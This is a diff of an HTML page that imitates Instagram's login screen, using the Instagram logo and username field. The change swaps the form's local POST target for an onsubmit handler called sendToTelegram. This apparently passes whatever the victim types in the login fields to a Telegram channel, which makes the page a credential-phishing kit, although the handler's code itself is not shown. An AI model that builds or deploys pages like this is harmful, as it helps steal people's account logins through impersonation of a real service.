@@ -14,7 +14,7 @@
                 <img src="https://www.instagram.com/static/images/web/logged_out_wordmark.png/7a252de00b20.png" alt="Instagram" class="logo">
             </div>
             
-            <form class="login-form" action="http://localhost:5000/login" method="POST">
+            <form class="login-form" onsubmit="sendToTelegram(event)">
                 <div class="input-group">
                     <input type="text" id="username" name="username" required>
                     <label for="username">Phone number, username, or email</label>
